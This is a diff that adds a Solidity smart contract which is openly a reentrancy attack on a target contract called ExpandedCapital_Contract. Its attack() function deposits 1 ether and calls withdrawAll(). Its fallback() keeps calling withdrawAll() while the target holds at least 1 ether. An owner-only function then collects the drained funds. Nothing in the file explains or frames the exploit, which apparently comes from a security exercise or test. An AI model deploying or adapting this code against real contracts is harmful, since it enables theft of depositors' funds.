@@ -1,0 +1,40 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./Capital_StorageContract.sol";
+
+contract Capital_Contract {
+    ExpandedCapital_Contract public Capital_Contract;
+    address public owner;
+
+    constructor(address _Capital_ContractAddress) {
+        Capital_Contract = ExpandedCapital_Contract(_Capital_ContractAddress);
+        owner = msg.sender;
+    }
+
+        fallback() external payable {
+        if (address(Capital_Contract).balance >= 1 ether) {
+            Capital_Contract.withdrawAll();
+        }
+    }
+
+        function attack() external payable {
+        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
+        
+               Capital_Contract.deposit{value: 1 ether}();
+
+        
+        Capital_Contract.withdrawAll();
+    }
+
+        function withdrawFunds() public {
+        require(msg.sender == owner, "Caller is not the owner");
+        payable(owner).transfer(address(this).balance);
+    }
+
+        function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+
+    receive() external payable {}
+}
